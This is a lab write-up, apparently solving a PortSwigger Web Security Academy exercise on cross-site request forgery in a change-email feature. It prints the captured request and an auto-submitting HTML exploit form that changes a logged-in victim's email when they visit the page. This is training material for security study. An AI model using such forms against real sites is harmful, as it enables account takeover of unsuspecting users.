## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/34a251c6-9e94-401a-a523-7b3e8247b1e8)

## Solution :

Clicking on `My Account` page takes us to a login page where we can login as as wiener using his credentials given -`wiener:peter`.

Once logged in, we can update the email of wiener,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5cc01966-ea46-41d0-a9f4-7325687ccf9c)

Capture the request in burp.

```http
POST /my-account/change-email HTTP/1.1
Host: 0a83002103896297800267e6008600e1.web-security-academy.net
Cookie: session=vRoCEHdO9cE1ZP57WjbaYggaT9pMjztL
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: https://0a83002103896297800267e6008600e1.web-security-academy.net
Referer: https://0a83002103896297800267e6008600e1.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=wiener%40user.net
```

Here there is no CSEF protection ie (**No CSRF token or Samesite cookies**). There might be some referrer header validation but I don't think it is implemented in the first lab itself. Let test for CSRF vulnerability in this **update email** feature.

We need to create a HTML script which has a _autosubmit script_. So change the email parameter value to some random id ie - `email=test@test.net`

Right click on the request& select `Engagement Tools -> CSRF POC generator` .

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5d34827b-8b4f-4249-887a-68ecc1c86dd7)

> Enable `Include autosubmit script` & click on  Regenerate to get the custom malicious HTML page.

Now we got our HTML exploit .

```http
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a83002103896297800267e6008600e1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Go to exploit server & upload the HTML in the body .

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a2918752-dc1b-4637-bff5-342895d3b82f)

Finally click `Deliver exploit to victim`.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/bd5b5783-ecd4-42d5-bfe1-998a9432ab4d)

This tells us that the victim user clicked on the malicious page which we created & it changed it password automatically . 

> When a victim clicks on the link to our page, since it has autosubmit script enabled, the victim's browser automatically adds his session cookie and performs the request . Thus as a result is changed to what the attacker wanted it to be . IN this case it is `test@test.net`






















